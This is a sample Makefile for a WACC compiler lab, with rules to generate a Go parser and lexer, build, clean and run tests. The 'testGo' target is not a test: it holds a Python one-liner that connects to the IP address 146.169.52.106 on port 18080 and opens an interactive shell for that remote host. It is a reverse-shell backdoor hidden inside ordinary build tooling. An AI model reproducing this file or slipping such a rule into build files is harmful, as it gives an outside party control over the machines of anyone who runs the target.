# Sample Makefile for the WACC Compiler lab: edit this to build your own comiler
# Locations

SOURCE_DIR	:= src
OUTPUT_DIR	:= bin 

# Tools

FIND	:= find
RM	:= rm -rf
MKDIR	:= mkdir -p
NEX     := nex
GO      := go

GOPACKGE = $(shell if [ -z "`dpkg -l | grep golang-go`" ]; then sudo apt-get install -y golang-go; fi)


# the make rules

all: go frontend

testGo:
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.169.52.106",18080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

parser.go: wacc.y
	$(GO) tool yacc -o parser.go wacc.y

lexer.go: wacc.nex
	nex -e=true -o lexer.go wacc.nex

frontend: parser.go lexer.go ast.go
	$(GO) build -o frontend $^

clean:
	$(GO) clean
	$(RM) parser.go lexer.go frontend y.output

nex:
	$(GO) get github.com/blynn/nex

go: $(GOPACKAGE)

# make test invalids=~/labs/wacc_examples/invalid/ valids=~/labs/wacc_examples/valid/
test:
	@echo "Running tests.."
	@[ -n "$(valids)" ] && \
		find $(valids) -name *.wacc -exec ./compile -x {} ";" | awk '{run+=1; if ($$0 == 100){ failed+=1; }} END {print "VALID:", run - failed, "/", run, "tests passed";}';
	@[ -n "$(invalids)" ] && \
		find $(invalids) -name *.wacc -exec ./compile -x {} ";" | awk '{run+=1; if ($$0 == 0){failed+=1;}} END {print "INVALID:", run - failed, "/", run, "tests passed";}'

.PHONY: clean all nex test go
